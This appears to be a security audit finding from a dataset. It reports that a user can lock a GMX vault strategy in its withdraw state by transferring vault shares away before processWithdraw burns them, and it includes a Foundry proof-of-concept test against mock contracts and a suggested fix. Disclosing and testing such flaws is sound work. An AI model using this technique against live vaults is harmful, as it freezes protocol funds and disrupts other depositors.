# [H] User can revert processWithdraw

## Summary
Severity: High
Contest weight: 0.7887
Dataset id: 15549
Source: https://huggingface.co/datasets/Zaevlad/audit-findings-dataset
Type: audit-finding

## Details
When a user wants to withdraw his tokens after depositing, the LP tokens are first sent to GMX. GMX then sends back the deposited tokens. Before the user receives them, their Vault Shares are burned in processWithdraw:

```solidity
File: GMXWithdraw.sol#processWithdraw
197: self.vault.burn(self.withdrawCache.user, self.withdrawCache.withdrawParams.shareAmt);
```

A user could, after the LP tokens have been transferred to GMX and the Vault is waiting for the callback, transfer his Vault Shares away from his address. This would result in not having enough tokens left during the burn, causing a revert. Afterward, the Vault would be stuck in the 'Withdraw' state because, although the keeper could call the function again, it would result in revert again.

Here is a POC that demonstrates how a user can cause the processWithdraw to revert:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;
import { console, console2 } from "forge-std/Test.sol";
import { TestUtils } from "../../helpers/TestUtils.sol";
import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { IERC20Errors } from "@openzeppelin/contracts/interfaces/draft-IERC6093.sol";
import { GMXMockVaultSetup } from "./GMXMockVaultSetup.t.sol";
import { GMXTypes } from "../../../contracts/strategy/gmx/GMXTypes.sol";
import { GMXTestHelper } from "./GMXTestHelper.sol";

import { IDeposit } from "../../../contracts/interfaces/protocols/gmx/IDeposit.sol";
import { IEvent } from "../../../contracts/interfaces/protocols/gmx/IEvent.sol";
import { Attacker } from "./Attacker.sol";

contract GMXDepositTest is GMXMockVaultSetup, GMXTestHelper, TestUtils {
    function test_POC4() public {
        //owner deposits
        vm.startPrank(address(owner));
        createAndExecuteDeposit(address(WETH), address(USDC), address(WETH), 10 ether, 0, SLIPPAGE, EXECUTIONFEE);
        vm.stopPrank();

        //user1 deposits
        vm.startPrank(address(user1));
        createAndExecuteDeposit(address(WETH), address(USDC), address(WETH), 10 ether, 0, SLIPPAGE, EXECUTIONFEE);
        vm.stopPrank();
        
        uint256 vaultSharesAmt = IERC20(address(vault)).balanceOf(address(user1)); //Vault Shares from user1 to withdraw
        vm.startPrank(address(user1));
        createWithdrawal(address(USDC), vaultSharesAmt, 0, SLIPPAGE, EXECUTIONFEE); //User 1 creates a withdrawal
        IERC20(address(vault)).transfer(address(user2), vaultSharesAmt); //Before processWithdraw is executed and the user's Vault Shares are burned, he sends them away

        vm.expectRevert(
            abi.encodeWithSelector(IERC20Errors.ERC20InsufficientBalance.selector, address(user1), 0, vaultSharesAmt)
        );
        mockExchangeRouter.executeWithdrawal(address(WETH), address(USDC), address(vault), address(callback)); //executeWithdraw reverted as there are no tokens to burn
        vm.stopPrank();

        GMXTypes.Store memory _store = vault.store();
        assert(uint256(_store.status) == uint256(GMXTypes.Status.Withdraw)); //shows that the vault is still in the Withdraw status
    }
}
```

The POC can be started with this command: forge test --match-test test_POC4 -vv

A user could put the Vault into a 'Stuck' state that can only be exited through 'emergencyPause' and 'emergencyResume.' This would take some time as 'emergencyResume' can only be called by the owner, who is a Multisig with a Timelock. (A keeper could also call 'processWithdrawCancellation,' but in this case, the debt to the lending vault would not be repaid. The tokens withdrawn by GMX would simply remain in the vault, and the user's Vault Shares would not be burned.)

## Recommendation
Tokens should be burned immediately after remove liquidity is called in GMXWithdraw.sol:
```diff
154: self.vault.burn(self.withdrawCache.user, self.withdrawCache.withdrawParams.shareAmt);
197: self.vault.burn(self.withdrawCache.user, self.withdrawCache.withdrawParams.shareAmt);
```
